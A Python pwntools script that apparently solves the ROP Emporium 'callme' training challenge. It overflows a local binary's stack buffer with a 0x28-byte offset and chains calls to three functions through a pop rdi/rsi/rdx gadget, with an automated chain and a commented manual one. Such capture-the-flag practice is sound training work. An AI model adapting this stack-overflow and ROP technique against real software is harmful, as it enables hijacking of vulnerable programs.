#!/usr/bin/python3

# ROP Emporium - CallMe

from pwn import *
#context.log_level = 'debug'

executable = './callme'
io = process(executable)
context.binary = binary = ELF(executable)

offset = b"A" * 0x20 + b"B" * 0x8      # Buf + RBP

# Arguments
arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

# Automated exploit with ROP Chain
rop = ROP(binary)
rop.callme_one(arg1, arg2, arg3)
rop.callme_two(arg1, arg2, arg3)
rop.callme_three(arg1, arg2, arg3)
payload = offset + rop.chain()

# Manually crafted exploit
# payload = flat([
#     offset,                          # Offset = Buf + RBP
#     p64(0x000000000040093c),         # pop rdi ; pop rsi ; pop rdx ; ret
#     p64(arg1),                       # Argument 1
#     p64(arg2),                       # Argument 2
#     p64(arg3),                       # Argument 3
#     binary.symbols.callme_one,       # Function
#     p64(0x000000000040093c),         # pop rdi ; pop rsi ; pop rdx ; ret
#     p64(arg1),                       # Argument 1
#     p64(arg2),                       # Argument 2
#     p64(arg3),                       # Argument 3
#     binary.symbols.callme_two,       # Function
#     p64(0x000000000040093c),         # pop rdi ; pop rsi ; pop rdx ; ret
#     p64(arg1),                       # Argument 1
#     p64(arg2),                       # Argument 2
#     p64(arg3),                       # Argument 3
#     binary.symbols.callme_three,     # Function
# ])

# Exploit
io.recvuntil(b"> ")
io.sendline(payload)
# io.sendline()

# io.interactive()
# exit() 

io.recvline()
data = io.recvall().decode()

success('Pwned!')
print(data)
exit()
